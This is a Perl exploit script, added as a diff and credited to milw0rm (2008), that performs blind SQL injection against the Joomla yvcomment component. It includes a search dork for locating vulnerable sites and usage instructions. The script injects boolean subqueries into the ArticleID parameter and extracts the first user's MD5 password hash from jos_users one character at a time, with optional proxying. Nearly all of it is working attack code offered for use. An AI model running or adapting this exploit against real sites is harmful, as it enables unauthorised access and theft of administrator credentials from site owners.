@@ -1,0 +1,111 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use Getopt::Long;
+
+if(!$ARGV[1])
+{
+  print "                                                                        \n";
+  print "  ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo\n";
+  print "  o   Joomla Component yvcomment Blind SQL Injection Exploit            o\n";
+  print "  o   Author:His0k4 [ALGERIAN HaCkeR]                                   o\n";
+  print "  o                                                                     o\n";
+  print "  o   Conctact: His0k4.hlm[at]gamil.com                                 o\n";
+  print "  o   Greetz:   All friends & muslims HacKeRs                           o\n";
+  print "  o                                                                     o\n";
+  print "  o   Dork :   inurl:yvcomment                                          o\n";
+  print "  o   Usage:   perl yvcomment.pl host path <options>                    o\n";
+  print "  o   Example: perl yvcomment.pl www.host.com /joomla/ -a 2             o\n";
+  print "  o                                                                     o\n";
+  print "  o   Options:                                                          o\n";
+  print "  o     -a   valid Article id                                           o\n";
+  print "  o   Note:                                                             o\n";
+  print "  o You can Change the match string by any content of the correct query o\n";
+  print "  ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo\n";
+  exit;
+}
+
+my $host    = $ARGV[0];
+my $path    = $ARGV[1];
+my $userid  = 1;
+my $aid     = $ARGV[2];
+
+my %options = ();
+GetOptions(\%options, "u=i", "p=s", "a=i");
+
+print "[~] Exploiting...\n";
+
+if($options{"u"})
+{
+  $userid = $options{"u"};
+}
+
+if($options{"a"})
+{
+  $aid = $options{"a"};
+}
+
+syswrite(STDOUT, "[~] MD5-Hash: ", 14);
+
+for(my $i = 1; $i <= 32; $i++)
+{
+  my $f = 0;
+  my $h = 48;
+  while(!$f && $h <= 57)
+  {
+    if(istrue2($host, $path, $userid, $aid, $i, $h))
+    {
+      $f = 1;
+      syswrite(STDOUT, chr($h), 1);
+    }
+    $h++;
+  }
+  if(!$f)
+  {
+    $h = 97;
+    while(!$f && $h <= 122)
+    {
+      if(istrue2($host, $path, $userid, $aid, $i, $h))
+      {
+        $f = 1;
+        syswrite(STDOUT, chr($h), 1);
+      }
+      $h++;
+    }
+  }
+}
+
+print "\n[~] Exploiting done\n";
+
+sub istrue2
+{
+  my $host  = shift;
+  my $path  = shift;
+  my $uid   = shift;
+  my $aid   = shift;
+  my $i     = shift;
+  my $h     = shift;
+ 
+  my $ua = LWP::UserAgent->new;
+  my $query = "http://".$host.$path."index.php?option=com_yvcomment&view=comment&ArticleID=".$aid." and ascii(SUBSTRING((SELECT password FROM jos_users LIMIT 0,1 ),".$i.",1))=".$h."";
+ 
+  if($options{"p"})
+  {
+    $ua->proxy('http', "http://".$options{"p"});
+  }
+ 
+  my $resp = $ua->get($query);
+  my $content = $resp->content;
+  my $regexp = "DateAndAuthor";
+ 
+  if($content =~ /$regexp/)
+  {
+    return 1;
+  }
+  else
+  {
+    return 0;
+  }
+
+}
+
+# milw0rm.com [2008-06-08]
